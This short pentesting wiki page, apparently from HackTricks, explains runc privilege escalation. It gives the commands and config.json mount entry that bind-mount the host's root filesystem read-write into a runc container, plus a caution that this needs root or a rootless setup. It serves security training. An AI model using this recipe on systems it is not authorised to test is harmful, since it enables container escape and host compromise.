# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

If you want to learn more about **runc** check the following page:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

If `runc` is available to a rootful process on the host, you can use an OCI bundle whose mount configuration recursively bind-mounts the host's `/` at `/` inside the container, exposing the host filesystem in that mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> The documented `runc run` workflow is rootful: runc's own examples label it "run as root." An unprivileged user needs a rootless configuration such as `runc spec --rootless`, and runc documents that user namespaces must be enabled for that mode.<sup>[[1]](#references)</sup>

## References

- [1] [runc: CLI tool for spawning and running containers](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)

{{#include ../../banners/hacktricks-training.md}}
